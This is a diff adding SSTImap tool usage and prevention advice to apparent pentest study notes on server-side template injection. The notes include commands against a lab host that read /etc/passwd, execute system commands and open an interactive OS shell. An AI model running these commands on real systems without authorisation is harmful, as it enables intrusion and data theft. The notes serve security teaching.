@@ -11,6 +11,8 @@
     - [Information Disclosure](#information-disclosure-1)
     - [LFI](#lfi-1)
     - [RCE](#rce-1)
+  - [SSTI Tools](#ssti-tools)
+  - [Prevention](#prevention)
 
 ---
 
@@ -215,3 +217,67 @@ To achieve remote code execution, you can use a PHP built-in function such as ``
 
 ![ssti 11](../../../images/ssti_11.png)
 
+## SSTI Tools
+
+The most popular tool for identifying and exploiting SSTI vulnerabilities is [tplmap](https://github.com/epinna/tplmap). However, tplmap is not maintained anymore and runs on the deprecated Python2 version. Therefore, you will use the more modern [SSTImap](https://github.com/vladko312/SSTImap) to aid the SSTI exploitation process.
+
+```bash
+d41y@htb[/htb]$ git clone https://github.com/vladko312/SSTImap
+
+d41y@htb[/htb]$ cd SSTImap
+
+d41y@htb[/htb]$ pip3 install -r requirements.txt
+
+d41y@htb[/htb]$ python3 sstimap.py 
+
+    ╔══════╦══════╦═══════╗ ▀█▀
+    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
+    ║ ╚════╣ ╚════╗ ║ ║ ║{║ _ __ ___ __ _ _ __
+    ╚════╗ ╠════╗ ║ ║ ║ ║*║ | '_ ` _ \ / _` | '_ \
+    ╔════╝ ╠════╝ ║ ║ ║ ║}║ | | | | | | (_| | |_) |
+    ╚══════╩══════╝ ╚═╝ ╚╦╝ |_| |_| |_|\__,_| .__/
+                             │ | |
+                                                |_|
+[*] Version: 1.2.0
+[*] Author: @vladko312
+[*] Based on Tplmap
+[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.
+It is the end user's responsibility to obey all applicable local, state, and federal laws.
+Developers assume no liability and are not responsible for any misuse or damage caused by this program
+[*] Loaded plugins by categories: languages: 5; engines: 17; legacy_engines: 2
+[*] Loaded request body types: 4
+[-] SSTImap requires target URL (-u, --url), URLs/forms file (--load-urls / --load-forms) or interactive mode (-i, --interactive)
+```
+
+```bash
+d41y@htb[/htb]$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test
+
+<SNIP>
+
+[+] SSTImap identified the following injection point:
+
+  Query parameter: name
+  Engine: Twig
+  Injection: *
+  Context: text
+  OS: Linux
+  Technique: render
+  Capabilities:
+    Shell command execution: ok
+    Bind and reverse shell: ok
+    File write: ok
+    File read: ok
+    Code evaluation: ok, php code
+```
+
+| Command | Description | Full Example |
+| ------- | ----------- | ------------ |
+| ```-D``` | download a remote file to your local machine | ```python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'``` |
+| ```-S``` | execute a system command | ```python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id``` |
+| ```--os-shell``` | obtain an interactive shell | ```python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell``` |
+
+## Prevention
+
+To prevent SSTI vulnerabilities, you must ensure that user input is never fed into the call to the template engine's rendering function in the template parameter. This can be achieved by carefully going through the different code paths and ensuring that user input is never added to a template before a call to the rendering function.
+
+Suppose a web application intends to have users modify existing templates or upload new ones for business reasons. In that case, it is crucial to implement proper hardening measures to prevent the takeover of the web server. This process can include hardening the template engine by removing potentially dangerous functions that can be used to achieve remote code execution from the execution environment. Removing dangerous functions prevents attackers from using these functions in their payloads. However, this technique is prone to bypasses. A better approach would be to separate the execution environment in which the template engine runs entirely from the web server, for instance, by setting up a separate execution environment such as a Docker container.
